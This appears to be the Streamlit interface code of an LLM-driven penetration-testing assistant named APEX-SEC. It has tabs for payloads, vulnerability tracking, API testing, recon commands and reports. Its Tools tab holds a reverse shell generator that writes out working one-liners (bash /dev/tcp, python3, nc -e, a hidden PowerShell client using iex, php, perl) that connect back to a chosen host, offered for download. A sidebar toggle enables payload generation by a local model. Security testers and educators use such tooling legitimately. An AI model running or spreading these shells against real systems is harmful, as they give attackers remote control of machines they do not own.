config: ConfigManager = st.session_state.config_mgr
memory: MemoryManager = st.session_state.memory
tracker: VulnerabilityTracker = st.session_state.v_tracker
bridge: LLMBridge = st.session_state.llm_bridge
orchestrator: ChatOrchestrator = st.session_state.orchestrator
sid: str = st.session_state.session_id


# =========================================================================
# SECTION 22 - SIDEBAR
# =========================================================================

def _render_sidebar() -> None:
    with st.sidebar:
        st.markdown("### ⚙️ Command Center")
        st.markdown("---")

        # ---------- Target Profile ----------
        st.markdown("#### 🎯 Target Profile")
        ip = st.text_input("Target IP / Host", value=tracker.target.ip_address, key="sb_ip")
        hostname = st.text_input("Hostname", value=tracker.target.hostname, key="sb_host")
        os_info = st.text_input("Operating System", value=tracker.target.os_info, key="sb_os")
        mac = st.text_input("MAC Address", value=tracker.target.mac_address, key="sb_mac")
        env = st.selectbox(
            "Environment",
            ["lab", "staging", "production", "ctf", "bug-bounty"],
            index=["lab", "staging", "production", "ctf", "bug-bounty"].index(
                tracker.target.environment
            ) if tracker.target.environment in ["lab", "staging", "production", "ctf", "bug-bounty"] else 0,
            key="sb_env",
        )
        org = st.text_input("Organization", value=tracker.target.organization, key="sb_org")
        scope = st.text_area("Scope Notes", value=tracker.target.scope_notes, height=60, key="sb_scope")

        if st.button("💾 Save Target", key="btn_save_target"):
            tracker.set_target(TargetProfile(
                ip_address=ip, hostname=hostname, os_info=os_info,
                mac_address=mac, environment=env, organization=org,
                scope_notes=scope,
            ))
            bridge.invalidate()
            st.success("Target saved.")
            st.rerun()

        st.markdown("---")

        # ---------- Model Config ----------
        st.markdown("#### 🧠 AI Model Config")
        model = st.text_input(
            "Model", value=str(config.get("model")),
            help="Examples: llama3, llama3.1, mistral, qwen2.5, dolphin-mixtral",
            key="sb_model",
        )
        temperature = st.slider(
            "Temperature", 0.0, 1.0,
            float(config.get("temperature")), 0.05, key="sb_temp",
        )
        top_p = st.slider(
            "Top-P", 0.1, 1.0,
            float(config.get("top_p")), 0.05, key="sb_topp",
        )
        num_predict = st.slider(
            "Max Tokens", 256, 8192,
            int(config.get("num_predict")), 256, key="sb_tokens",
        )
        context_msgs = st.slider(
            "Memory Context (messages)", 5, 200,
            int(config.get("context_messages")), 5, key="sb_ctx",
            help="How many recent messages to send to the model.",
        )
        allow_payload = st.checkbox(
            "Enable Payload Generation",
            value=bool(config.get("allow_payload_gen")), key="sb_payload",
        )

        if st.button("💾 Save Model Config", key="btn_save_model"):
            changed = config.update({
                "model": model,
                "temperature": temperature,
                "top_p": top_p,
                "num_predict": num_predict,
                "context_messages": context_msgs,
                "allow_payload_gen": allow_payload,
            })
            if changed:
                bridge.invalidate()
            st.success("Config saved.")
            st.rerun()

        with st.expander("🔎 Detect Local Models"):
            if st.button("Scan Ollama", key="btn_scan_models"):
                models = bridge.list_local_models()
                if models:
                    st.success(f"Found {len(models)} model(s):")
                    for m in models:
                        st.code(m)
                else:
                    st.warning("No local models detected. Is Ollama running?")

        st.markdown("---")

        # ---------- Persona ----------
        st.markdown("#### 🎭 Persona")
        persona_keys = list(PERSONAS.keys())
        current_persona = str(config.get("persona"))
        idx = persona_keys.index(current_persona) if current_persona in persona_keys else 0
        persona = st.selectbox(
            "Active Role",
            persona_keys,
            index=idx,
            format_func=get_persona_label,
            key="sb_persona",
        )
        if persona != current_persona:
            config.set("persona", persona)
            bridge.invalidate()

        if persona == "custom":
            custom_prompt = st.text_area(
                "Custom Persona Prompt",
                value=str(config.get("custom_prompt", "")),
                height=120, key="sb_custom",
            )
            if st.button("💾 Save Custom Prompt", key="btn_save_custom"):
                config.set("custom_prompt", custom_prompt)
                bridge.invalidate()
                st.success("Custom prompt saved.")
                st.rerun()

        st.markdown("---")

        # ---------- Threat Intel ----------
        st.markdown("#### 🔄 Threat Intelligence")
        c1, c2 = st.columns(2)
        with c1:
            if st.button("Sync CISA", key="btn_sync_cisa"):
                with st.spinner("Syncing..."):
                    ok, msg = sync_cisa_feed()
                (st.success if ok else st.error)(msg)
                if ok:
                    st.rerun()
        with c2:
            if st.button("Cache Info", key="btn_cache_info"):
                items = load_threat_intel()
                (st.info if items else st.warning)(
                    f"{len(items)} entries cached" if items else "No cache found."
                )

        st.markdown("---")

        # ---------- Sessions ----------
        st.markdown("#### 💬 Sessions")
        sessions = memory.list_sessions()
        st.caption(f"Total sessions: {len(sessions)}")

        session_labels = {
            s["session_id"]: f"{s['title'][:30]} — {s['updated_at'][:19]}"
            for s in sessions
        }
        if session_labels:
            current = st.selectbox(
                "Switch Session",
                list(session_labels.keys()),
                format_func=lambda x: session_labels.get(x, x[:8]),
                index=0 if st.session_state.session_id not in session_labels
                else list(session_labels.keys()).index(st.session_state.session_id),
                key="sb_session_switch",
            )
            if current != st.session_state.session_id:
                st.session_state.session_id = current
                st.session_state.llm_bridge.invalidate()
                st.rerun()

        new_title = st.text_input("New session title", value="New Engagement", key="sb_new_title")
        if st.button("➕ Create Session", key="btn_new_session"):
            new_sid = memory.create_session(title=new_title or "New Engagement")
            st.session_state.session_id = new_sid
            bridge.invalidate()
            st.rerun()

        if st.button("🗑️ Delete Current Session", key="btn_del_session"):
            memory.delete_session(st.session_state.session_id)
            st.session_state.session_id = memory.create_session(title="New Engagement")
            bridge.invalidate()
            st.rerun()

        st.markdown("---")

        # ---------- Status ----------
        st.markdown("#### 📊 Status")
        st.success(f"Model: {config.get('model')}")
        st.info(f"Persona: {get_persona_label(str(config.get('persona')))}")
        st.info(f"Context: {config.get('context_messages')} messages")
        msg_count = memory.count_messages(sid)
        st.info(f"Messages in session: {msg_count}")
        st.warning("🔒 On-Premises Execution")


_render_sidebar()


# =========================================================================
# SECTION 23 - MAIN TABS
# =========================================================================

tab_chat, tab_payloads, tab_vulns, tab_api, tab_iot, tab_tools, tab_reports = st.tabs([
    "💬 Chat",
    "🧨 Payload Library",
    "🐞 Vulnerabilities",
    "🔌 API Testing",
    "📡 IoT / Recon",
    "🧰 Tools",
    "📄 Reports",
])


# =========================================================================
# SECTION 23.1 - CHAT TAB
# =========================================================================

def _render_chat_tab() -> None:
    session_history = memory.get_messages(sid)

    # Render history
    for msg in session_history:
        role = msg["role"]
        with st.chat_message(role):
            st.markdown(msg["content"])
            st.caption(msg.get("created_at", ""))

    # Screenshot / file uploader
    with st.expander("📎 Attach Evidence (Screenshots / Files)", expanded=False):
        uploaded = st.file_uploader(
            "Upload screenshot or log file",
            type=["png", "jpg", "jpeg", "gif", "pdf", "txt", "log", "json", "xml"],
            accept_multiple_files=True,
            key="chat_uploads",
        )
        caption = st.text_input("Caption (optional)", key="chat_caption")
        linked_cve = st.text_input("Link to CVE / Finding ID (optional)", key="chat_linked_cve")

        if uploaded and st.button("💾 Save Evidence", key="btn_save_evidence"):
            saved = 0
            for f in uploaded:
                item = EvidenceManager.save_upload(f, sid, caption, linked_cve)
                if item:
                    memory.add_evidence(
                        session_id=sid,
                        filename=item.filename,
                        filepath=item.filepath,
                        mime_type=item.mime_type,
                        size_bytes=item.size_bytes,
                        caption=item.caption,
                        linked_cve=item.linked_cve,
                    )
                    saved += 1
            if saved:
                st.success(f"Saved {saved} evidence file(s).")
                st.rerun()
            else:
                st.error("No files were saved.")

    # Evidence gallery
    evidence_items = memory.list_evidence(sid)
    if evidence_items:
        with st.expander(f"🗂️ Evidence Gallery ({len(evidence_items)} item(s))", expanded=False):
            for ev in evidence_items:
                col1, col2 = st.columns([1, 3])
                with col1:
                    if EvidenceManager.is_image(ev["mime_type"]):
                        try:
                            st.image(ev["filepath"], use_container_width=True)
                        except Exception:
                            st.text("[image]")
                    else:
                        st.text(Path(ev["filename"]).suffix.upper())
                with col2:
                    st.markdown(f"**{ev['filename']}**")
                    st.caption(
                        f"{_human_size(ev['size_bytes'])} | "
                        f"{ev['created_at'][:19]} | CVE: {ev.get('linked_cve') or '—'}"
                    )
                    if ev.get("caption"):
                        st.caption(f"Caption: {ev['caption']}")
                    if st.button("🗑️ Remove", key=f"rm_ev_{ev['evidence_id']}"):
                        try:
                            if os.path.exists(ev["filepath"]):
                                os.remove(ev["filepath"])
                        except OSError:
                            pass
                        memory.delete_evidence(ev["evidence_id"])
                        st.rerun()

    # Chat input
    user_input = st.chat_input("Ask APEX-SEC anything... (full conversation memory)")
    if user_input:
        with st.chat_message("user"):
            st.markdown(user_input)

        with st.chat_message("assistant"):
            placeholder = st.empty()
            with st.spinner("Analyzing..."):
                ok, response = orchestrator.process(sid, user_input, tracker)
            if ok:
                placeholder.markdown(response)
            else:
                placeholder.error(response)
        st.rerun()


with tab_chat:
    _render_chat_tab()


# =========================================================================
# SECTION 23.2 - PAYLOAD LIBRARY TAB
# =========================================================================

def _render_payloads_tab() -> None:
    st.subheader("🧨 Payload Library")
    st.caption(
        f"{PayloadLibrary.count()} payloads across "
        f"{len(PayloadLibrary.categories())} categories — for authorized lab testing only."
    )

    col1, col2 = st.columns([1, 2])
    with col1:
        cats = ["all"] + PayloadLibrary.categories()
        selected_cat = st.selectbox("Category", cats, key="pl_cat")
    with col2:
        keyword = st.text_input(
            "Search (name, payload, tags)",
            placeholder="e.g., union, metadata, rce, jwt",
            key="pl_search",
        )

    if keyword.strip():
        results = PayloadLibrary.search(keyword)
    elif selected_cat == "all":
        results = PayloadLibrary.all_payloads()
    else:
        results = [{**p, "category": selected_cat} for p in PayloadLibrary.get(selected_cat)]

    if not results:
        st.info("No payloads match your query.")
        return

    sev_class = {
        "critical": "severity-critical",
        "high": "severity-high",
        "medium": "severity-medium",
        "low": "severity-low",
    }

    for i, p in enumerate(results):
        with st.expander(
            f"[{p['category'].upper()}] {p['name']} — "
            f"{p.get('severity', 'medium').upper()}"
        ):
            st.markdown(
                f"<span class='{sev_class.get(p.get('severity', 'medium'), '')}'>"
                f"Severity: {p.get('severity', 'medium').upper()}</span>",
                unsafe_allow_html=True,
            )
            st.code(p.get("payload", ""), language="text")
            if p.get("notes"):
                st.caption(p["notes"])
            if p.get("tags"):
                st.caption("Tags: " + ", ".join(p["tags"]))
            st.download_button(
                "⬇️ Download payload",
                data=p.get("payload", ""),
                file_name=f"{p['category']}_{_safe_filename(p['name'])}.txt",
                mime="text/plain",
                key=f"dl_payload_{i}_{p['category']}_{p['name']}",
            )


with tab_payloads:
    _render_payloads_tab()


# =========================================================================
# SECTION 23.3 - VULNERABILITIES TAB
# =========================================================================

def _render_vulns_tab() -> None:
    st.subheader("🐞 Vulnerability Tracker")

    # Add form
    with st.form("vuln_form", clear_on_submit=True):
        st.markdown("##### ➕ Add Vulnerability")
        c1, c2 = st.columns(2)
        with c1:
            cve = st.text_input("CVE / Finding ID", placeholder="CVE-2024-XXXX or LAB-001")
            severity = st.selectbox("Severity", ["Critical", "High", "Medium", "Low", "Info"])
            cvss = st.number_input("CVSS Score (0.0 - 10.0)", 0.0, 10.0, 0.0, 0.1)
            title = st.text_input("Title", placeholder="SQL Injection in /api/login")
        with c2:
            cvss_vector = st.text_input("CVSS Vector", placeholder="CVSS:3.1/AV:N/AC:L/...")
            tools = st.text_input("Tools Used (comma-separated)", placeholder="sqlmap, burp")
            refs = st.text_input("References (comma-separated)", placeholder="https://...")

        desc = st.text_area("Description", height=80)
        impact = st.text_area("Impact", height=60)
        steps = st.text_area("Steps to Reproduce (one per line)", height=80)
        mitigation = st.text_area("Remediation", height=80)

        submitted = st.form_submit_button("Add Finding")
        if submitted:
            if not cve.strip():
                st.error("CVE / Finding ID is required.")
            else:
                entry = VulnerabilityEntry(
                    cve_id=cve.strip(),
                    severity=severity,
                    title=title.strip(),
                    description=desc.strip(),
                    mitigation=mitigation.strip(),
                    cvss_score=float(cvss),
                    cvss_vector=cvss_vector.strip(),
                    impact=impact.strip(),
                    references=[r.strip() for r in refs.split(",") if r.strip()],
                    tools_used=[t.strip() for t in tools.split(",") if t.strip()],
                    steps_to_reproduce=[s.strip() for s in steps.splitlines() if s.strip()],
                )
                tracker.add(entry)
                st.success(f"Added {cve}.")
                st.rerun()

    st.markdown("---")
    st.markdown("##### 📋 Tracked Findings")

    if not tracker.knowledge_base:
        st.info("No findings tracked yet.")
    else:
        # Summary
        summary = tracker.summary()
        cols = st.columns(5)
        for col, sev in zip(cols, ["Critical", "High", "Medium", "Low", "Info"]):
            col.metric(sev, summary.get(sev, 0))

        st.markdown("---")
        for v in tracker.knowledge_base:
            with st.expander(f"**{v.cve_id}** — {v.title or 'Untitled'} ({v.severity})"):
                st.markdown(f"**Severity:** {v.severity}")
                if v.cvss_score:
                    st.markdown(f"**CVSS:** {v.cvss_score} `{v.cvss_vector}`")
                if v.description:
                    st.markdown(f"**Description:** {v.description}")
                if v.impact:
                    st.markdown(f"**Impact:** {v.impact}")
                if v.steps_to_reproduce:
                    st.markdown("**Steps to Reproduce:**")
                    for i, s in enumerate(v.steps_to_reproduce, 1):
                        st.markdown(f"{i}. {s}")
                if v.tools_used:
                    st.markdown(f"**Tools:** {', '.join(v.tools_used)}")
                if v.mitigation:
                    st.markdown(f"**Remediation:** {v.mitigation}")
                if v.references:
                    st.markdown("**References:**")
                    for r in v.references:
                        st.markdown(f"- {r}")

                if st.button(f"🗑️ Remove {v.cve_id}", key=f"rm_v_{v.cve_id}"):
                    tracker.remove(v.cve_id)
                    st.rerun()

    st.markdown("---")
    st.markdown("##### 📚 CISA KEV Feed (Top 25)")
    cisa = load_threat_intel()
    if cisa:
        search_cve = st.text_input("Search CISA cache", key="cisa_search")
        items = search_threat_intel(search_cve, 25) if search_cve.strip() else cisa[:25]
        for item in items:
            st.markdown(
                f"**{item.get('cveID', 'N/A')}** — "
                f"{item.get('vulnerabilityName', 'Unknown')}"
            )
            st.caption(
                f"{item.get('vendorProject', '')} {item.get('product', '')} — "
                f"{item.get('shortDescription', '')[:200]}"
            )
            st.caption(f"Due: {item.get('dueDate', 'N/A')} | Source: {item.get('source', 'CISA-KEV')}")
            st.markdown("---")
    else:
        st.info("No CISA data cached. Click 'Sync CISA' in the sidebar.")


with tab_vulns:
    _render_vulns_tab()


# =========================================================================
# SECTION 23.4 - API TESTING TAB
# =========================================================================

def _render_api_tab() -> None:
    st.subheader("🔌 API Testing Assistant")
    st.caption("Methodology checklists and ready-to-use commands for authorized API testing.")

    api_type = st.radio(
        "API Type",
        ["REST", "GraphQL", "Authentication"],
        horizontal=True,
        key="api_type",
    )

    if api_type == "REST":
        st.markdown("##### REST API Methodology")
        for step in APITester.rest_methodology():
            st.markdown(f"- {step}")

    elif api_type == "GraphQL":
        st.markdown("##### GraphQL Methodology")
        for step in APITester.graphql_methodology():
            st.markdown(f"- {step}")

    else:
        st.markdown("##### Authentication Bypass Checklist")
        for step in APITester.auth_bypass_checklists():
            st.markdown(f"- {step}")

    st.markdown("---")
    st.markdown("##### 🧪 curl Command Generator")
    c1, c2 = st.columns([1, 3])
    with c1:
        method = st.selectbox("Method", ["GET", "POST", "PUT", "DELETE", "PATCH"], key="curl_method")
    with c2:
        url = st.text_input("URL", placeholder="https://api.target.tld/v1/users", key="curl_url")

    headers_raw = st.text_area(
        "Headers (one per line: Key: Value)",
        value="Authorization: Bearer <token>\nContent-Type: application/json",
        height=80, key="curl_headers",
    )
    body = st.text_area("Request Body (JSON/XML)", height=100, key="curl_body")

    if url.strip():
        headers = {}
        for line in headers_raw.splitlines():
            if ":" in line:
                k, v = line.split(":", 1)
                headers[k.strip()] = v.strip()
        cmd = APITester.generate_curl(method, url.strip(), headers, body or None)
        st.code(cmd, language="bash")
        st.download_button(
            "⬇️ Download curl command",
            data=cmd,
            file_name="api_test.sh",
            mime="text/plain",
            key="dl_curl",
        )

    st.markdown("---")
    st.markdown("##### 📦 Common Injection Payloads")
    common = APITester.common_payloads()
    for category, payloads in common.items():
        with st.expander(category.replace("_", " ").title()):
            for p in payloads:
                st.code(p, language="text")


with tab_api:
    _render_api_tab()


# =========================================================================
# SECTION 23.5 - IOT / RECON TAB
# =========================================================================

def _render_iot_tab() -> None:
    st.subheader("📡 IoT & Network Reconnaissance")
    st.caption("Ready-to-run recon commands for authorized lab environments.")

    target = st.text_input(
        "Target",
        value=tracker.target.ip_address or "192.168.1.1",
        key="recon_target",
    )
    subnet = st.text_input("Subnet", value="192.168.1.0/24", key="recon_subnet")

    section = st.selectbox(
        "Category",
        ["Network Discovery", "Port Scanning", "Web Recon", "IoT Specific"],
        key="recon_section",
    )

    if section == "Network Discovery":
        cmds = ReconHelper.network_discovery(subnet)
    elif section == "Port Scanning":
        cmds = ReconHelper.port_scanning(target)
    elif section == "Web Recon":
        cmds = ReconHelper.web_recon(f"http://{target}")
    else:
        cmds = ReconHelper.iot_specific(target)

    for c in cmds:
        with st.expander(f"**{c['tool']}** — {c['purpose']}"):
            st.code(c["cmd"], language="bash")
            st.download_button(
                "⬇️ Download command",
                data=c["cmd"],
                file_name=f"{_safe_filename(c['tool'])}.sh",
                mime="text/plain",
                key=f"dl_recon_{c['tool']}",
            )


with tab_iot:
    _render_iot_tab()


# =========================================================================
# SECTION 23.6 - TOOLS TAB
# =========================================================================

def _render_tools_tab() -> None:
    st.subheader("🧰 Custom Security Tools")

    tool = st.selectbox(
        "Select Tool",
        [
            "Hash Generator",
            "Base64 Encoder / Decoder",
            "URL Encoder / Decoder",
            "JWT Decoder",
            "Reverse Shell Generator",
            "CVE Lookup (NVD)",
        ],
        key="tool_select",
    )

    # ---------------- Hash Generator ----------------
    if tool == "Hash Generator":
        text = st.text_area("Input text", key="hash_input", height=80)
        algo = st.selectbox("Algorithm", ["md5", "sha1", "sha256", "sha512"], key="hash_algo")
        if text:
            try:
                h = hashlib.new(algo, text.encode("utf-8")).hexdigest()
                st.code(h, language="text")
            except ValueError as exc:
                st.error(f"Hash error: {exc}")

    # ---------------- Base64 ----------------
    elif tool == "Base64 Encoder / Decoder":
        text = st.text_area("Input", key="b64_input", height=80)
        mode = st.radio("Mode", ["Encode", "Decode"], horizontal=True, key="b64_mode")
        if text:
            try:
                if mode == "Encode":
                    st.code(base64.b64encode(text.encode("utf-8")).decode("utf-8"))
                else:
                    st.code(base64.b64decode(text.encode("utf-8")).decode("utf-8", errors="replace"))
            except Exception as exc:
                st.error(f"Error: {exc}")

    # ---------------- URL Encoder ----------------
    elif tool == "URL Encoder / Decoder":
        text = st.text_area("Input", key="url_input", height=80)
        mode = st.radio("Mode", ["Encode", "Decode"], horizontal=True, key="url_mode")
        if text:
            try:
                st.code(quote(text) if mode == "Encode" else unquote(text))
            except Exception as exc:
                st.error(f"Error: {exc}")

    # ---------------- JWT Decoder ----------------
    elif tool == "JWT Decoder":
        token = st.text_area("JWT Token", key="jwt_input", height=80)
        if token:
            try:
                parts = token.strip().split(".")
                if len(parts) < 2:
                    st.error("Invalid JWT format.")
                else:
                    def _pad(s: str) -> str:
                        return s + "=" * (-len(s) % 4)
                    header = json.loads(base64.urlsafe_b64decode(_pad(parts[0])).decode("utf-8"))
                    payload = json.loads(base64.urlsafe_b64decode(_pad(parts[1])).decode("utf-8"))
                    st.markdown("**Header**")
                    st.json(header)
                    st.markdown("**Payload**")
                    st.json(payload)
                    st.markdown("**Signature**")
                    st.code(parts[2] if len(parts) > 2 else "(none)")
            except Exception as exc:
                st.error(f"Decode error: {exc}")

    # ---------------- Reverse Shell ----------------
    elif tool == "Reverse Shell Generator":
        st.caption("For authorized lab testing only.")
        c1, c2 = st.columns(2)
        with c1:
            lhost = st.text_input("LHOST", value="10.0.0.1", key="rs_lhost")
        with c2:
            lport = st.text_input("LPORT", value="4444", key="rs_lport")
        shell_type = st.selectbox(
            "Shell Type",
            ["bash", "python3", "nc", "powershell", "php", "perl"],
            key="rs_type",
        )
        if lhost and lport:
            shells = {
                "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
                "python3": (
                    f"python3 -c 'import socket,subprocess,os;"
                    f"s=socket.socket();s.connect((\"{lhost}\",{lport}));"
                    f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
                    f"os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
                ),
                "nc": f"nc -e /bin/sh {lhost} {lport}",
                "powershell": (
                    f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
                    f"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
                    f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
                    f"while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
                    f"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
                    f"$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';"
                    f"$sbt=([text.encoding]::ASCII).GetBytes($sb2);"
                    f"$s.Write($sbt,0,$sbt.Length);$s.Flush()}}"
                ),
                "php": (
                    f"php -r '$sock=fsockopen(\"{lhost}\",{lport});"
                    f"exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
                ),
                "perl": (
                    f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
                    f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                    f"if(connect(S,sockaddr_in($p,inet_aton($i)))){{"
                    f"open(STDIN,\">&S\");open(STDOUT,\">&S\");"
                    f"open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
                ),
            }
            st.code(shells[shell_type], language="bash")
            st.download_button(
                "⬇️ Download payload",
                data=shells[shell_type],
                file_name=f"revshell_{shell_type}.txt",
                mime="text/plain",
                key="dl_revshell",
            )

    # ---------------- CVE Lookup ----------------
    elif tool == "CVE Lookup (NVD)":
        cve_input = st.text_input("CVE ID", placeholder="CVE-2024-1234", key="nvd_cve")
        if st.button("🔎 Fetch from NVD", key="btn_nvd"):
            if not cve_input.strip():
                st.warning("Enter a CVE ID.")
            else:
                with st.spinner("Querying NVD..."):
                    data = fetch_nvd_cve(cve_input.strip())
                if data:
                    st.success(f"Found {data['cve_id']}")
                    st.json(data)
                    st.download_button(
                        "⬇️ Download JSON",
                        data=json.dumps(data, indent=4),
                        file_name=f"{data['cve_id']}.json",
                        mime="application/json",
                        key="dl_nvd",
                    )
                else:
                    st.error("CVE not found or NVD request failed.")


with tab_tools:
    _render_tools_tab()


# =========================================================================
# SECTION 23.7 - REPORTS TAB
# =========================================================================

def _render_reports_tab() -> None:
    st.subheader("📄 Professional Report Generator")
    st.caption("Generates Markdown, HTML, and JSON reports from tracked findings and evidence.")

    if not tracker.knowledge_base:
        st.warning("No findings tracked yet. Add vulnerabilities in the 'Vulnerabilities' tab.")

    c1, c2 = st.columns(2)
    with c1:
        author = st.text_input("Report Author", value=str(config.get("report_author")), key="rep_author")
    with c2:
        org = st.text_input("Organization", value=str(config.get("report_org")), key="rep_org")

    if st.button("💾 Save Author Info", key="btn_save_author"):
        config.update({"report_author": author, "report_org": org})
        st.success("Author info saved.")

    st.markdown("---")

    evidence = memory.list_evidence(sid)

    st.markdown("##### 📊 Live Summary")
    summary = tracker.summary()
    cols = st.columns(5)
    for col, sev in zip(cols, ["Critical", "High", "Medium", "Low", "Info"]):
        col.metric(sev, summary.get(sev, 0))

    st.markdown("---")

    md_report = ReportGenerator.generate_markdown(
        tracker=tracker,
        evidence=evidence,
        session_id=sid,
        author=author,
        org=org,
    )
    html_report = ReportGenerator.generate_html(md_report, title="APEX-SEC Report")
    json_report = ReportGenerator.generate_json(tracker, evidence, sid)

    report_ts = datetime.now().strftime("%Y%m%d_%H%M%S")

    tab_md, tab_html, tab_json = st.tabs(["Markdown", "HTML", "JSON"])

    with tab_md:
        st.markdown(md_report)
        st.download_button(
            "⬇️ Download Markdown",
            data=md_report,
            file_name=f"apex_report_{report_ts}.md",
            mime="text/markdown",
            key="dl_md",
        )

    with tab_html:
        st.components.v1.html(html_report, height=600, scrolling=True)
        st.download_button(
            "⬇️ Download HTML",
            data=html_report,
            file_name=f"apex_report_{report_ts}.html",
            mime="text/html",
            key="dl_html",
        )

    with tab_json:
        st.json(json.loads(json_report))
        st.download_button(
            "⬇️ Download JSON",
            data=json_report,
            file_name=f"apex_report_{report_ts}.json",
            mime="application/json",
            key="dl_json",
        )

    st.markdown("---")
    st.markdown("##### 💾 Save Report to Disk")
    if st.button("Save All Formats to config/reports/", key="btn_save_reports"):
        try:
            (REPORTS_DIR / f"apex_report_{report_ts}.md").write_text(md_report, encoding="utf-8")
            (REPORTS_DIR / f"apex_report_{report_ts}.html").write_text(html_report, encoding="utf-8")
            (REPORTS_DIR / f"apex_report_{report_ts}.json").write_text(json_report, encoding="utf-8")
            st.success(f"Saved to {REPORTS_DIR}")
        except (IOError, OSError) as exc:
            st.error(f"Save failed: {exc}")


with tab_reports:
    _render_reports_tab()


# =========================================================================
# SECTION 24 - FOOTER
# =========================================================================

st.markdown("---")
col1, col2, col3, col4 = st.columns(4)
col1.caption(f"🛡️ {APP_NAME} v{APP_VERSION}")
col2.caption(f"💬 Session: {sid[:8]}...")
col3.caption(f"🧠 Model: {config.get('model')}")
col4.caption(f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M')}")

st.caption(
    "⚠️ For authorized security testing and educational purposes only. "
    "Users must obtain explicit written permission before testing any system."
)


# =========================================================================
# END OF FILE
# =========================================================================
